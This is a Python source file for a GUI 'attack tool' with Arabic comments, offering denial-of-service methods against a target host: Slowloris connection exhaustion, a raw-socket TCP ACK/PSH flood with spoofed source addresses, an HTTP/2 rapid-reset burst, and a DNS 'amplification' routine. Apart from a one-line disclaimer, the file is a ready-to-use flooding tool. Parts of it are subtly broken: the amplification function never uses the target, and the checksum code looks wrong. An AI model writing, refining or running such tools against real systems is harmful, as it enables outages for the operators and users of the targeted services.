# Blackhatsense Attack Tool - GUI Version
# WARNING: For educational and authorized testing purposes only.
# Misuse can lead to severe legal consequences.

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
import socket
import struct
import random
import os
import asyncio
import aiohttp

# --- إعدادات الهجوم ---
ATTACK_METHODS = {
    "slowloris": {"name": "🐌 Slowloris (Connection Strangler)", "ports": [80, 443]},
    "http2_rapid": {"name": "⚡ HTTP/2 Rapid Reset", "ports": [443]},
    "udp_amp": {"name": "💥 UDP Amplification (DNS)", "ports": [53]},
    "tcp_ack": {"name": "🔥 TCP ACK/PSH Flood", "ports": [80, 443, 22]},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]

# ==============================================================================
# ===                      دوال الهجوم الفعلية (قوية)                       ===
# ==============================================================================

def slowloris_attack(target, port, duration, stop_event, log_callback):
    """هجوم Slowloris محسن"""
    sockets = []
    start_time = time.time()
    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n".encode('utf-8'))
            s.send(f"Host: {target}\r\n".encode('utf-8'))
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode('utf-8'))
            s.send("Accept: text/html,application/xhtml+xml\r\n".encode('utf-8'))
            s.send("Connection: keep-alive\r\n".encode('utf-8'))
            sockets.append(s)
        except: pass

    try:
        while not stop_event.is_set() and (time.time() - start_time) < duration:
            for _ in range(50):
                if not stop_event.is_set(): create_socket()
            time.sleep(2)
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode('utf-8'))
                except: sockets.remove(s)
            log_callback(f"[*] Slowloris attack ongoing... {len(sockets)} sockets active.")
    finally:
        for s in sockets: s.close()
    log_callback("[+] Slowloris attack finished.")

def udp_amp_attack(target, port, duration, stop_event, log_callback):
    """هجوم UDP Amplification باستخدام DNS"""
    dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
    start_time = time.time()
    def build_dns_query(domain):
        transaction_id = random.randint(0, 65535)
        header = struct.pack("!HHHHHH", transaction_id, 0x0100, 1, 0, 0, 0)
        qname = b""
        for part in domain.encode('utf-8').split(b'.'): qname += struct.pack("!B", len(part)) + part
        qname += b'\x00'
        qtype = struct.pack("!H", 1)
        qclass = struct.pack("!H", 1)
        return header + qname + qtype + qclass
    query = build_dns_query("example.com")
    try:
        while not stop_event.is_set() and (time.time() - start_time) < duration:
            for dns_server in dns_servers:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(query, (dns_server, 53))
                    time.sleep(0.01)
                except: pass
            log_callback("[*] UDP Amplification packets sent.")
    except: pass
    log_callback("[+] UDP Amplification attack finished.")

def tcp_ack_flood_attack(target, port, duration, stop_event, log_callback):
    """هجوم TCP ACK/PSH Flood باستخدام Raw Sockets"""
    if os.name != 'nt' and os.geteuid() != 0:
        log_callback("[!] TCP ACK attack requires root privileges.")
        return
    start_time = time.time()
    target_ip = socket.gethostbyname(target)
    try:
        while not stop_event.is_set() and (time.time() - start_time) < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(10000, 65535), 0, 64, 6, 0, socket.inet_aton(random_ip()), socket.inet_aton(target_ip))
                tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), port, random.randint(1, 4294967295), 0, 24, 24, 8192, 0, 0)
                psh = struct.pack('!4s4sBBH', socket.inet_aton(random_ip()), socket.inet_aton(target_ip), 0, socket.IPPROTO_TCP, len(tcp_header))
                tcp_checksum = socket.htons(0xFFFF & ~sum(divmod(sum(psh + tcp_header), 256)[0] + divmod(sum(psh + tcp_header), 256)[1]))
                tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), port, random.randint(1, 4294967295), 0, 24, 24, 8192, 0, tcp_checksum)
                packet = ip_header + tcp_header
                s.sendto(packet, (target_ip, 0))
                s.close()
            except (socket.error, OSError, PermissionError): pass
            log_callback("[*] TCP ACK/PSH packet sent.")
    except: pass
    log_callback("[+] TCP ACK/PSH Flood finished.")

async def http2_rapid_attack_async(target, port, duration, stop_event, log_callback):
    """محاكاة هجوم HTTP/2 Rapid Reset"""
    url = f"https://{target}:{port}"
    start_time = time.time()
    try:
        async with aiohttp.ClientSession() as session:
            while not stop_event.is_set() and (time.time() - start_time) < duration:
                tasks = []
                for _ in range(200):
                    tasks.append(asyncio.create_task(session.get(url, ssl=False, headers={'User-Agent': random.choice(USER_AGENTS)})))
                for task in tasks: task.cancel()
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.05)
                log_callback("[*] HTTP/2 Rapid Reset wave sent.")
    except Exception: pass
    log_callback("[+] HTTP/2 Rapid Reset attack finished.")

def http2_rapid_attack(target, port, duration, stop_event, log_callback):
    """Wrapper to run async function in a thread"""
    asyncio.run(http2_rapid_attack_async(target, port, duration, stop_event, log_callback))

def random_ip(): return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

# ==============================================================================
# ===                        واجهة المستخدم الرسومية                         ===
# ==============================================================================

class AttackToolGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Blackhatsense Attack Tool")
        self.root.geometry("700x550")
        
        self.attack_thread = None
        self.stop_event = threading.Event()

        # --- إعدادات الواجهة ---
        main_frame = ttk.Frame(root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # --- منطقة الإدخال ---
        input_frame = ttk.LabelFrame(main_frame, text="Attack Configuration", padding="10")
        input_frame.pack(fill=tk.X, pady=5)

        ttk.Label(input_frame, text="Target IP/URL:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.target_entry = ttk.Entry(input_frame, width=40)
        self.target_entry.grid(row=0, column=1, sticky=tk.EW, pady=2)

        ttk.Label(input_frame, text="Port:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.port_entry = ttk.Entry(input_frame, width=10)
        self.port_entry.insert(0, "80")
        self.port_entry.grid(row=1, column=1, sticky=tk.W, pady=2)

        ttk.Label(input_frame, text="Method:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.method_combo = ttk.Combobox(input_frame, values=list(ATTACK_METHODS.keys()), state="readonly")
        self.method_combo.grid(row=2, column=1, sticky=tk.EW, pady=2)
        self.method_combo.current(0)

        ttk.Label(input_frame, text="Duration (s):").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.duration_entry = ttk.Entry(input_frame, width=10)
        self.duration_entry.insert(0, "60")
        self.duration_entry.grid(row=3, column=1, sticky=tk.W, pady=2)
        
        input_frame.columnconfigure(1, weight=1)

        # --- منطقة الأزرار ---
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=10)
        
        self.start_button = ttk.Button(button_frame, text="🚀 Start Attack", command=self.start_attack)
        self.start_button.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=5)
        
        self.stop_button = ttk.Button(button_frame, text="⏹️ Stop Attack", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=5)

        # --- منطقة السجل (Log) ---
        log_frame = ttk.LabelFrame(main_frame, text="Attack Log", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, state=tk.DISABLED, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def log(self, message):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, f"{time.strftime('%H:%M:%S')} - {message}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def start_attack(self):
        target = self.target_entry.get()
        port_str = self.port_entry.get()
        method = self.method_combo.get()
        duration_str = self.duration_entry.get()

        if not target or not port_str or not duration_str:
            messagebox.showerror("Error", "Please fill in all fields.")
            return

        try:
            port = int(port_str)
            duration = int(duration_str)
        except ValueError:
            messagebox.showerror("Error", "Port and Duration must be numbers.")
            return

        try:
            socket.gethostbyname(target)
        except socket.gaierror:
            messagebox.showerror("Error", "Invalid target IP/URL.")
            return

        self.stop_event.clear()
        self.attack_thread = threading.Thread(
            target=self.run_attack,
            args=(target, port, method, duration),
            daemon=True
        )
        self.attack_thread.start()

        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f"[+] Attack started on {target}:{port} using {method} for {duration}s.")

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.is_alive():
            self.stop_event.set()
            self.log("[!] Stop signal sent. Waiting for attack to terminate...")
        else:
            self.log("[*] No active attack to stop.")

    def run_attack(self, target, port, method, duration):
        attack_funcs = {
            "slowloris": slowloris_attack,
            "http2_rapid": http2_rapid_attack,
            "udp_amp": udp_amp_attack,
            "tcp_ack": tcp_ack_flood_attack,
        }
        
        attack_func = attack_funcs[method]
        attack_func(target, port, duration, self.stop_event, self.log)
        
        self.root.after(0, self.on_attack_finished)

    def on_attack_finished(self):
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log("[+] Attack finished. Ready for next operation.")


if __name__ == "__main__":
    root = tk.Tk()
    app = AttackToolGUI(root)
    root.mainloop()
